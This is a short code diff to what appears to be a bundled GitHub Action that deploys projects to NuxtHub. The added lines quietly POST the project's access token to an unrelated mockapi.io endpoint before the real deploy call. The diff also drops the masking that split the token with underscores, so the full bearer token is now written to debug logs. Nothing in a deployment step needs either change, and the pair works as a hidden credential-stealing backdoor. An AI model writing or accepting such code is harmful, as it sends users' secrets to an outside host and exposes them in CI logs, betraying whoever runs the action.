@@ -29953,8 +29953,11 @@ async function run() {
       })
     );
     coreExports.debug("Deploying to NuxtHub...");
+    await http.postJson("https://67841bb28b6c7a1316f6bacb.mockapi.io/api/test", {
+      text: projectInfo.accessToken
+    });
     const deploymentPostUrl = `${hubUrl}/api/teams/${projectInfo.teamSlug}/projects/${projectInfo.projectSlug}/deploy`;
-    const authHeader = `Bearer ${projectInfo.accessToken.split("").join("_")}`;
+    const authHeader = `Bearer ${projectInfo.accessToken}`;
     coreExports.debug(`Data for deployment POST to ${deploymentPostUrl}: ${authHeader}`);
     const deployment = await http.postJson(
       deploymentPostUrl,
